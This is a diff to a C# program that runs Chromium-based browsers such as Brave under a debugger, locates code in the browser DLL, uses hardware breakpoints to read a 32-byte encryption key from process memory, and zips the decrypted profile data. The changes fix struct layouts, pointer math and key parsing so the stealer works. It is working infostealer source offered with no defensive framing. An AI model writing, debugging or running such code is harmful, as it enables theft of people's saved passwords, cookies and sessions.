@@ -70,7 +70,7 @@ namespace ConsoleApp1
                     @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
                     @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe"
                 },
-                DllName = "chrome.dll",
+                DllName = "brave.dll",
                 UserDataSubdir = new[] { "BraveSoftware", "Brave-Browser", "User Data" },
                 OutputDir = "brave",
                 TempPrefix = "brave_tmp",
@@ -150,13 +150,17 @@ namespace ConsoleApp1
             public IntPtr hStdError;
         }
 
-        [StructLayout(LayoutKind.Sequential)]
+        [StructLayout(LayoutKind.Explicit)]
         public struct DEBUG_EVENT
         {
+            [FieldOffset(0)]
             public uint dwDebugEventCode;
+            [FieldOffset(4)]
             public uint dwProcessId;
+            [FieldOffset(8)]
             public uint dwThreadId;
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1024)]
+            [FieldOffset(16)] // Alignment padding for x64
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 160)]
             public byte[] u;
         }
 
@@ -197,57 +201,41 @@ namespace ConsoleApp1
             public long High;
         }
 
-        [StructLayout(LayoutKind.Sequential, Pack = 16)]
+        [StructLayout(LayoutKind.Explicit, Size = 1232)]
         public struct CONTEXT64
         {
-            public ulong P1Home;
-            public ulong P2Home;
-            public ulong P3Home;
-            public ulong P4Home;
-            public ulong P5Home;
-            public ulong P6Home;
-            public uint ContextFlags;
-            public uint MxCsr;
-            public ushort SegCs;
-            public ushort SegDs;
-            public ushort SegEs;
-            public ushort SegFs;
-            public ushort SegGs;
-            public ushort SegSs;
-            public uint EFlags;
-            public ulong Dr0;
-            public ulong Dr1;
-            public ulong Dr2;
-            public ulong Dr3;
-            public ulong Dr6;
-            public ulong Dr7;
-            public ulong Rax;
-            public ulong Rcx;
-            public ulong Rdx;
-            public ulong Rbx;
-            public ulong Rsp;
-            public ulong Rbp;
-            public ulong Rsi;
-            public ulong Rdi;
-            public ulong R8;
-            public ulong R9;
-            public ulong R10;
-            public ulong R11;
-            public ulong R12;
-            public ulong R13;
-            public ulong R14;
-            public ulong R15;
-            public ulong Rip;
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
-            public byte[] FltSave;
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
-            public M128A[] VectorRegister;
-            public ulong VectorControl;
-            public ulong DebugControl;
-            public ulong LastBranchToRip;
-            public ulong LastBranchFromRip;
-            public ulong LastExceptionToRip;
-            public ulong LastExceptionFromRip;
+            [FieldOffset(0x30)] public uint ContextFlags;
+            [FieldOffset(0x34)] public uint MxCsr;
+            [FieldOffset(0x38)] public ushort SegCs;
+            [FieldOffset(0x3A)] public ushort SegDs;
+            [FieldOffset(0x3C)] public ushort SegEs;
+            [FieldOffset(0x3E)] public ushort SegFs;
+            [FieldOffset(0x40)] public ushort SegGs;
+            [FieldOffset(0x42)] public ushort SegSs;
+            [FieldOffset(0x44)] public uint EFlags;
+            [FieldOffset(0x48)] public ulong Dr0;
+            [FieldOffset(0x50)] public ulong Dr1;
+            [FieldOffset(0x58)] public ulong Dr2;
+            [FieldOffset(0x60)] public ulong Dr3;
+            [FieldOffset(0x68)] public ulong Dr6;
+            [FieldOffset(0x70)] public ulong Dr7;
+            [FieldOffset(0x78)] public ulong Rax;
+            [FieldOffset(0x80)] public ulong Rcx;
+            [FieldOffset(0x88)] public ulong Rdx;
+            [FieldOffset(0x90)] public ulong Rbx;
+            [FieldOffset(0x98)] public ulong Rsp;
+            [FieldOffset(0xA0)] public ulong Rbp;
+            [FieldOffset(0xA8)] public ulong Rsi;
+            [FieldOffset(0xB0)] public ulong Rdi;
+            [FieldOffset(0xB8)] public ulong R8;
+            [FieldOffset(0xC0)] public ulong R9;
+            [FieldOffset(0xC8)] public ulong R10;
+            [FieldOffset(0xD0)] public ulong R11;
+            [FieldOffset(0xD8)] public ulong R12;
+            [FieldOffset(0xE0)] public ulong R13;
+            [FieldOffset(0xE8)] public ulong R14;
+            [FieldOffset(0xF0)] public ulong R15;
+            [FieldOffset(0xF8)] public ulong Rip;
         }
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
@@ -282,7 +270,7 @@ namespace ConsoleApp1
         public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesRead);
+        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesRead);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
@@ -319,7 +307,7 @@ namespace ConsoleApp1
         public const uint CONTEXT_CONTROL = CONTEXT_AMD64 | 0x00000001;
         public const uint CONTEXT_INTEGER = CONTEXT_AMD64 | 0x00000002;
         public const uint CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x00000010;
-        public const uint CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | 0x00000004; // Simplified for our needs
+        public const uint CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_DEBUG_REGISTERS;
 
         [StructLayout(LayoutKind.Sequential)]
         public struct CRYPT_INTEGER_BLOB
@@ -513,7 +501,7 @@ namespace ConsoleApp1
             {
                 if (debugEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT)
                 {
-                    LOAD_DLL_DEBUG_INFO loadDll = Marshal.PtrToStructure<LOAD_DLL_DEBUG_INFO>(Marshal.UnsafeAddrOfPinnedArrayElement(debugEvent.u, 0));
+                    LOAD_DLL_DEBUG_INFO loadDll = PtrToStructure<LOAD_DLL_DEBUG_INFO>(debugEvent.u);
                     StringBuilder sb = new StringBuilder(260);
                     if (GetFinalPathNameByHandle(loadDll.hFile, sb, (uint)sb.Capacity, 0) > 0)
                     {
@@ -540,7 +528,7 @@ namespace ConsoleApp1
                 }
                 else if (debugEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT)
                 {
-                    EXCEPTION_DEBUG_INFO exception = Marshal.PtrToStructure<EXCEPTION_DEBUG_INFO>(Marshal.UnsafeAddrOfPinnedArrayElement(debugEvent.u, 0));
+                    EXCEPTION_DEBUG_INFO exception = PtrToStructure<EXCEPTION_DEBUG_INFO>(debugEvent.u);
                     if (exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP)
                     {
                         if (exception.ExceptionRecord.ExceptionAddress == targetAddress)
@@ -563,6 +551,19 @@ namespace ConsoleApp1
             }
         }
 
+        private static T PtrToStructure<T>(byte[] bytes) where T : struct
+        {
+            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
+            try
+            {
+                return Marshal.PtrToStructure<T>(handle.AddrOfPinnedObject());
+            }
+            finally
+            {
+                handle.Free();
+            }
+        }
+
         private static IntPtr FindTargetAddress(IntPtr hProcess, IntPtr baseAddr)
         {
             byte[] dosHeader = new byte[64];
@@ -570,11 +571,11 @@ namespace ConsoleApp1
             int lfanew = BitConverter.ToInt32(dosHeader, 60);
 
             byte[] ntHeaders = new byte[264];
-            if (!ReadProcessMemory(hProcess, baseAddr + lfanew, ntHeaders, (uint)ntHeaders.Length, out _)) return IntPtr.Zero;
+            if (!ReadProcessMemory(hProcess, (IntPtr)((long)baseAddr + lfanew), ntHeaders, (uint)ntHeaders.Length, out _)) return IntPtr.Zero;
 
             ushort numSections = BitConverter.ToUInt16(ntHeaders, 6);
             int sizeOfOptionalHeader = BitConverter.ToUInt16(ntHeaders, 20);
-            IntPtr sectionHeaderAddr = baseAddr + lfanew + 4 + 20 + sizeOfOptionalHeader;
+            IntPtr sectionHeaderAddr = (IntPtr)((long)baseAddr + lfanew + 4 + 20 + sizeOfOptionalHeader);
 
             byte[] sectionHeaders = new byte[numSections * 40];
             if (!ReadProcessMemory(hProcess, sectionHeaderAddr, sectionHeaders, (uint)sectionHeaders.Length, out _)) return IntPtr.Zero;
@@ -585,18 +586,20 @@ namespace ConsoleApp1
 
             for (int i = 0; i < numSections; i++)
             {
-                string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).TrimEnd('\0');
+                string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).Split('\0')[0];
                 if (name == ".rdata")
                 {
                     uint virtualSize = BitConverter.ToUInt32(sectionHeaders, i * 40 + 8);
                     uint virtualAddress = BitConverter.ToUInt32(sectionHeaders, i * 40 + 12);
                     byte[] data = new byte[virtualSize];
-                    ReadProcessMemory(hProcess, baseAddr + (int)virtualAddress, data, virtualSize, out _);
-                    int pos = FindSubsequence(data, targetBytes);
-                    if (pos != -1)
+                    if (ReadProcessMemory(hProcess, (IntPtr)((long)baseAddr + virtualAddress), data, virtualSize, out _))
                     {
-                        stringVa = baseAddr + (int)virtualAddress + pos;
-                        break;
+                        int pos = FindSubsequence(data, targetBytes);
+                        if (pos != -1)
+                        {
+                            stringVa = (IntPtr)((long)baseAddr + virtualAddress + pos);
+                            break;
+                        }
                     }
                 }
             }
@@ -605,22 +608,23 @@ namespace ConsoleApp1
 
             for (int i = 0; i < numSections; i++)
             {
-                string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).TrimEnd('\0');
+                string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).Split('\0')[0];
                 if (name == ".text")
                 {
                     uint virtualSize = BitConverter.ToUInt32(sectionHeaders, i * 40 + 8);
                     uint virtualAddress = BitConverter.ToUInt32(sectionHeaders, i * 40 + 12);
                     byte[] data = new byte[virtualSize];
-                    ReadProcessMemory(hProcess, baseAddr + (int)virtualAddress, data, virtualSize, out _);
-
-                    for (int pos = 0; pos < data.Length - 7; pos++)
+                    if (ReadProcessMemory(hProcess, (IntPtr)((long)baseAddr + virtualAddress), data, virtualSize, out _))
                     {
-                        if (data[pos] == 0x48 && data[pos + 1] == 0x8D && data[pos + 2] == 0x0D)
+                        for (int pos = 0; pos < data.Length - 7; pos++)
                         {
-                            int offset = BitConverter.ToInt32(data, pos + 3);
-                            IntPtr rip = baseAddr + (int)virtualAddress + pos + 7;
-                            IntPtr target = (IntPtr)((long)rip + offset);
-                            if (target == stringVa) return baseAddr + (int)virtualAddress + pos;
+                            if (data[pos] == 0x48 && data[pos + 1] == 0x8D && data[pos + 2] == 0x0D)
+                            {
+                                int offset = BitConverter.ToInt32(data, pos + 3);
+                                IntPtr rip = (IntPtr)((long)baseAddr + virtualAddress + pos + 7);
+                                IntPtr target = (IntPtr)((long)rip + offset);
+                                if (target == stringVa) return (IntPtr)((long)baseAddr + virtualAddress + pos);
+                            }
                         }
                     }
                 }
@@ -702,18 +706,23 @@ namespace ConsoleApp1
                     byte[] buffer = new byte[32];
                     if (ReadProcessMemory(hProcess, (IntPtr)ptr, buffer, (uint)buffer.Length, out _))
                     {
-                        ulong dataPtr = ptr;
+                        // Chromium stores its key in a std::string like structure
+                        // [data_ptr (8b)][length (8b)][capacity (8b)]
+                        // If length is <= 15, data might be stored inline (SSO), but for 32-byte keys it's always on heap.
+                        ulong dataPtr = BitConverter.ToUInt64(buffer, 0);
                         ulong length = BitConverter.ToUInt64(buffer, 8);
-                        if (length == 32) dataPtr = BitConverter.ToUInt64(buffer, 0);
 
-                        byte[] key = new byte[32];
-                        if (ReadProcessMemory(hProcess, (IntPtr)dataPtr, key, (uint)key.Length, out _))
+                        if (length == 32)
                         {
-                            if (key.Any(b => b != 0))
+                            byte[] key = new byte[32];
+                            if (ReadProcessMemory(hProcess, (IntPtr)dataPtr, key, (uint)key.Length, out _))
                             {
-                                ExtractAllProfilesData(key, null, config, userDataDir, zipPath);
-                                success = true;
-                                break;
+                                if (key.Any(b => b != 0))
+                                {
+                                    ExtractAllProfilesData(key, null, config, userDataDir, zipPath);
+                                    success = true;
+                                    break;
+                                }
                             }
                         }
                     }
@@ -902,7 +911,7 @@ namespace ConsoleApp1
         {
             try
             {
-                using (var zip = ZipFile.Open(zipPath, ZipArchiveMode.Update))
+                using (var zip = ZipFile.Open(zipPath, File.Exists(zipPath) ? ZipArchiveMode.Update : ZipArchiveMode.Create))
                 {
                     var entry = zip.CreateEntry(entryName);
                     using (var writer = new StreamWriter(entry.Open()))
